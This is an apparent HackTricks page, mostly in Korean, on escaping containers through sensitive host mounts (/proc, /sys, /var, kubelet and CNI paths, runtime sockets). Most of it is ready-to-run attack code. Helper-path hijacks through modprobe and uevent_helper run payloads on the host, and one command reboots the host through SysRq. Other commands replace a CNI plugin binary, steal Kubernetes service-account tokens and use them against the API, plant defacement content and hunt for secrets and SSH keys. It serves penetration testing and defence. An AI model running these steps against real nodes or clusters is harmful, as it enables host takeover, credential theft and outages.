# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## 개요

Host mounts는 가장 중요한 실전 container-escape 표면 중 하나다. 보통 신중하게 분리된 process view를 host 리소스에 대한 직접적인 가시성으로 무너뜨리기 때문이다. 위험한 경우는 `/`에만 국한되지 않는다. `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, device 관련 경로의 bind mounts는 kernel controls, credentials, neighboring container filesystems, runtime management interfaces를 노출할 수 있다.

이 페이지가 개별 protection page들과 별도로 존재하는 이유는 abuse model이 여러 부분에 걸쳐 있기 때문이다. writable host mount가 위험한 이유는 mount namespaces 때문이기도 하고, user namespaces 때문이기도 하고, AppArmor 또는 SELinux coverage 때문이기도 하며, 실제로 어떤 host path가 노출되었는지 때문이기도 하다. 이를 독립된 주제로 다루면 attack surface를 훨씬 더 쉽게 이해할 수 있다.

## `/proc` Exposure

procfs는 일반적인 process 정보와 고위험 kernel control interface를 모두 포함한다. 따라서 `-v /proc:/host/proc` 같은 bind mount나 예상치 못한 writable proc entry를 노출하는 container view는 정보 유출, denial of service, 또는 직접적인 host code execution으로 이어질 수 있다.

가치가 높은 procfs 경로는 다음과 같다:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

먼저 어떤 고가치 procfs entry가 보이거나 writable한지 확인하라:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

각 경로의 실용적 가치는 서로 다르며, 모두를 같은 영향도로 취급하면 triage가 더 어려워집니다:

- `/proc/sys/kernel/core_pattern`
If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash. A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
이 경로는 커널이 module-loading logic을 호출해야 할 때 사용하는 userspace helper를 제어합니다. 컨테이너에서 writable이고 host context에서 해석된다면, 또 다른 host code-execution primitive가 될 수 있습니다. 특히 helper 경로를 트리거할 방법과 결합될 때 더 흥미롭습니다.
- `/proc/sys/vm/panic_on_oom`
이것은 보통 깔끔한 escape primitive는 아니지만, OOM 조건을 kernel panic behavior로 바꾸어 memory pressure를 host-wide denial of service로 전환할 수 있습니다.
- `/proc/sys/fs/binfmt_misc`
등록 인터페이스가 writable하면, 공격자는 선택한 magic value에 대한 handler를 등록하고 일치하는 파일이 실행될 때 host-context execution을 얻을 수 있습니다.
- `/proc/config.gz`
kernel exploit triage에 유용합니다. host package metadata 없이도 어떤 subsystems, mitigations, optional kernel features가 활성화되어 있는지 확인하는 데 도움이 됩니다.
- `/proc/sysrq-trigger`
대체로 denial-of-service 경로이지만, 매우 심각한 경로입니다. 즉시 host를 reboot, panic, 또는 다른 방식으로 중단시킬 수 있습니다.
- `/proc/kmsg`
kernel ring buffer messages를 보여줍니다. host fingerprinting, crash analysis, 그리고 일부 환경에서는 kernel exploitation에 유용한 정보 leak에 도움이 됩니다.
- `/proc/kallsyms`
읽을 수 있다면 가치가 큽니다. exported kernel symbol information을 노출하며, kernel exploit development 중 address randomization 가정을 무너뜨리는 데 도움이 될 수 있습니다.
- `/proc/[pid]/mem`
직접적인 process-memory interface입니다. 대상 프로세스에 필요한 ptrace-style 조건으로 접근할 수 있다면, 다른 process의 memory를 읽거나 수정할 수 있습니다. 실제 영향은 credentials, `hidepid`, Yama, ptrace 제한에 크게 좌우되므로, 강력하지만 조건부인 경로입니다.
- `/proc/kcore`
시스템 memory의 core-image-style 보기를 제공합니다. 파일이 매우 크고 사용하기 까다롭지만, 의미 있게 읽을 수 있다면 host memory surface가 심각하게 노출되었다는 뜻입니다.
- `/proc/kmem` and `/proc/mem`
역사적으로 영향도가 높은 raw memory interface입니다. 많은 현대 시스템에서는 비활성화되었거나 강하게 제한되지만, 존재하고 사용할 수 있다면 critical finding으로 다뤄야 합니다.
- `/proc/sched_debug`
scheduling과 task 정보를 leak하여, 다른 process view가 예상보다 더 깨끗해 보일 때도 host process identities를 드러낼 수 있습니다.
- `/proc/[pid]/mountinfo`
컨테이너가 host에서 실제로 어디에 있는지, 어떤 path가 overlay-backed인지, 그리고 writable mount가 host content를 가리키는지 아니면 container layer만 가리키는지 재구성하는 데 매우 유용합니다.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
이 명령들은 유용합니다. 왜냐하면 여러 host-execution 트릭은 container 내부의 path를 host 관점에서 대응되는 path로 바꾸는 것을 필요로 하기 때문입니다.

### Full Example: `modprobe` Helper Path Abuse

만약 `/proc/sys/kernel/modprobe`가 container에서 writable이고 helper path가 host context에서 해석된다면, 공격자가 제어하는 payload로 redirect될 수 있습니다:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
정확한 트리거는 대상과 kernel 동작에 따라 달라지지만, 중요한 점은 writable helper path가 이후의 kernel helper invocation을 attacker-controlled host-path content로 redirect할 수 있다는 것이다.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

목표가 즉각적인 escape가 아니라 exploitability assessment라면:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
이 명령들은 유용한 symbol 정보가 보이는지, 최근 kernel messages가 흥미로운 상태를 드러내는지, 그리고 어떤 kernel features나 mitigations가 compiled in 되어 있는지 확인하는 데 도움이 됩니다. 영향은 보통 직접적인 escape는 아니지만, kernel-vulnerability triage를 크게 단축할 수 있습니다.

### Full Example: SysRq Host Reboot

`/proc/sysrq-trigger`가 writable이고 host view에 도달한다면:
```bash
echo b > /proc/sysrq-trigger
```
효과는 즉각적인 host reboot이다. 이것은 미묘한 예시는 아니지만, procfs 노출이 단순한 정보 disclosure보다 훨씬 더 심각할 수 있음을 분명히 보여준다.

## `/sys` Exposure

sysfs는 방대한 양의 kernel 및 device state를 노출한다. 일부 sysfs path는 주로 fingerprinting에 유용하지만, 다른 것들은 helper execution, device behavior, security-module configuration, 또는 firmware state에 영향을 줄 수 있다.

가치가 높은 sysfs path는 다음과 같다:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

이 path들은 각기 다른 이유로 중요하다. `/sys/class/thermal`은 thermal-management behavior에 영향을 주어, 노출이 심한 환경에서는 host stability에 영향을 줄 수 있다. `/sys/kernel/vmcoreinfo`는 crash-dump와 kernel-layout 정보를 leak할 수 있어 저수준 host fingerprinting에 도움이 된다. `/sys/kernel/security`는 Linux Security Modules가 사용하는 `securityfs` interface이므로, 그곳에 대한 예기치 않은 access는 MAC 관련 state를 노출하거나 변경할 수 있다. EFI variable path는 firmware-backed boot settings에 영향을 줄 수 있어, 일반적인 configuration file보다 훨씬 더 심각하다. `/sys/kernel/debug` 아래의 `debugfs`는 특히 위험한데, hardened production-facing kernel APIs보다 안전성에 대한 기대가 훨씬 낮은, 의도적으로 developer-oriented interface이기 때문이다.

이 path들을 검토할 때 유용한 command는 다음과 같다:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
이 명령들이 흥미로운 이유:

- `/sys/kernel/security`는 AppArmor, SELinux 또는 다른 LSM surface가 원래는 host-only로 남아 있어야 하는 방식으로 노출되는지 보여줄 수 있습니다.
- `/sys/kernel/debug`는 이 그룹에서 가장 우려되는 발견인 경우가 많습니다. `debugfs`가 mounted되어 있고 읽기 또는 쓰기가 가능하다면, 활성화된 debug nodes에 따라 정확한 위험이 달라지는 광범위한 kernel-facing surface가 예상됩니다.
- EFI variable 노출은 덜 흔하지만, 존재한다면 일반적인 runtime files가 아니라 firmware-backed settings를 건드리기 때문에 impact가 큽니다.
- `/sys/class/thermal`은 깔끔한 shell-style escape보다는 host stability와 hardware interaction에 주로 관련이 있습니다.
- `/sys/kernel/vmcoreinfo`는 주로 host-fingerprinting과 crash-analysis source로, low-level kernel state를 이해하는 데 유용합니다.

### Full Example: `uevent_helper`

`/sys/kernel/uevent_helper`가 writable이면, kernel은 `uevent`가 triggered될 때 attacker-controlled helper를 실행할 수 있습니다:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
그 이유는 helper path가 host의 관점에서 해석되기 때문입니다. 일단 트리거되면, helper는 현재 container 내부가 아니라 host context에서 실행됩니다.

## `/var` Exposure

host의 `/var`를 container에 mount하는 것은 `/`를 mount하는 것만큼 극적으로 보이지 않기 때문에 종종 과소평가됩니다. 실제로는 runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, 그리고 인접한 application filesystems에 도달하는 데 충분할 수 있습니다. 현대의 node에서는 `/var`가 운영상 가장 흥미로운 container state가 실제로 존재하는 곳인 경우가 많습니다.

### Kubernetes Example

`hostPath: /var`가 있는 pod는 종종 다른 pod의 projected tokens와 overlay snapshot content를 읽을 수 있습니다:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
이 명령들은 해당 mount가 단순한 애플리케이션 데이터만 노출하는지, 아니면 영향이 큰 cluster credentials를 노출하는지 알려주기 때문에 유용합니다. 읽을 수 있는 service-account token은 로컬 code execution을 곧바로 Kubernetes API access로 바꿀 수 있습니다.

token이 존재하면, token 발견에서 멈추지 말고 그것이 무엇에 접근할 수 있는지 확인하십시오:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
여기서의 영향은 로컬 node access보다 훨씬 더 클 수 있습니다. 광범위한 RBAC를 가진 token은 mounted `/var`를 cluster-wide compromise로 바꿀 수 있습니다.

### Docker And containerd Example

Docker hosts에서는 관련 데이터가 종종 `/var/lib/docker` 아래에 있고, containerd-backed Kubernetes nodes에서는 `/var/lib/containerd` 또는 snapshotter-specific paths 아래에 있을 수 있습니다:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
마운트된 `/var`가 다른 workload의 쓰기 가능한 snapshot contents를 노출한다면, 공격자는 현재 container configuration을 건드리지 않고도 application files를 수정하거나, web content를 심거나, startup scripts를 변경할 수 있습니다.

쓰기 가능한 snapshot content가 발견된 후의 구체적인 abuse ideas:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
These commands are useful because they show the three main impact families of mounted `/var`: application tampering, secret recovery, and lateral movement into neighboring workloads.

## Kubelet State, Plugins, And CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin`, 또는 `/etc/cni/net.d`의 mount는 종종 privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, 그리고 storage helpers를 통해 exposed 된다. 이러한 mounts는 "node plumbing"으로 쉽게 치부되지만, 새 pods의 execution path에 직접 놓여 있으며 kubelet credentials, projected secrets, registration sockets, 그리고 실행 가능한 host-side plugin binaries를 자주 포함한다.

High-value targets include:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands are:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
왜 이 경로들이 중요한가:

- `/var/lib/kubelet/pki`는 kubelet client certificates와 다른 node-local credentials를 노출할 수 있으며, cluster design에 따라 API server나 kubelet-facing TLS endpoints에 재사용될 수 있다.
- `/var/lib/kubelet/pods`에는 같은 node의 인접한 pods를 위한 projected service-account tokens과 mounted Secrets가 흔히 들어 있다.
- `/var/lib/kubelet/pod-resources/kubelet.sock`는 주로 reconnaissance surface이지만, 매우 유용하다: 어떤 pods와 containers가 현재 GPUs, hugepages, SR-IOV devices, 그리고 다른 scarce node-local resources를 소유하는지 보여준다.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, 그리고 `/var/lib/kubelet/plugins_registry`는 어떤 CSI, DRA, 그리고 device plugins가 설치되어 있는지, 그리고 kubelet이 어떤 sockets와 통신할 것으로 예상되는지 보여준다. 만약 이 디렉터리들이 단순히 readable인 것이 아니라 writable하다면, 이 finding은 훨씬 더 심각해진다.
- `/opt/cni/bin`과 `/etc/cni/net.d`는 pod-network setup path에 직접 위치한다. 여기서 writable access는 종종 단순한 configuration exposure가 아니라 지연된 host-execution primitive이다.

### Full Example: Writable `/opt/cni/bin`

만약 host CNI binary directory가 read-write로 mounted 되어 있다면, plugin을 교체하는 것만으로도 kubelet이 그 node에서 다음 pod sandbox를 생성할 때 host execution을 얻기에 충분할 수 있다:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
이것은 mounted `docker.sock`만큼 즉각적이지는 않지만, compromised Kubernetes infrastructure pods에서는 종종 더 현실적입니다. 중요한 점은 modified binary가 현재 container가 아니라 나중에 host network setup flow에 의해 실행된다는 것입니다.


## Runtime Sockets

Sensitive host mounts에는 전체 디렉터리보다는 runtime sockets가 포함되는 경우가 많습니다. 이것들은 매우 중요하므로 여기서 명시적으로 다시 언급할 가치가 있습니다:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
소켓 중 하나가 마운트되면 전체 exploitation 흐름은 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md)를 참조하세요.

빠른 첫 상호작용 패턴으로는:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
이들 중 하나가 성공하면, "mounted socket"에서 "더 높은 권한의 sibling container를 시작"하는 경로는 보통 어떤 kernel breakout path보다 훨씬 짧습니다.

## Mount-Related CVEs

Host mounts는 runtime 취약점과도 맞물립니다. 중요한 최근 사례는 다음과 같습니다:

- `CVE-2024-21626` in `runc`에서는, 유출된 directory file descriptor가 working directory를 host filesystem 위에 두도록 만들 수 있었습니다.
- `CVE-2024-23651`, `CVE-2024-23652`, `CVE-2024-23653` in BuildKit에서는, 악의적인 Dockerfiles, frontends, 그리고 `RUN --mount` 흐름이 build 중 host file access, deletion, 또는 elevated privileges를 다시 도입할 수 있었습니다.
- `CVE-2024-1753` in Buildah and Podman build flows에서는, build 중 조작된 bind mounts가 `/`를 read-write로 노출할 수 있었습니다.
- `CVE-2025-47290` in `containerd` 2.1.0에서는, image unpack 중 TOCTOU가 특별히 조작된 image가 pull 중 host filesystem을 수정하도록 할 수 있었습니다.

이 CVE들이 여기서 중요한 이유는 mount handling이 operator configuration만의 문제가 아님을 보여주기 때문입니다. runtime 자체도 mount-driven escape conditions를 도입할 수 있습니다.

## Checks

다음 명령을 사용해 가장 가치가 높은 mount exposure를 빠르게 찾으세요:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
What is interesting here:

- Host root, `/proc`, `/sys`, `/var`, and runtime sockets are all high-priority findings.
- Writable proc/sys entries often mean the mount is exposing host-global kernel controls rather than a safe container view.
- Mounted `/var` paths deserve credential and neighboring-workload review, not just filesystem review.
- Kubelet state directories and CNI/plugin paths deserve the same priority as runtime sockets because they often sit directly on the node's pod-creation and credential-distribution path.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
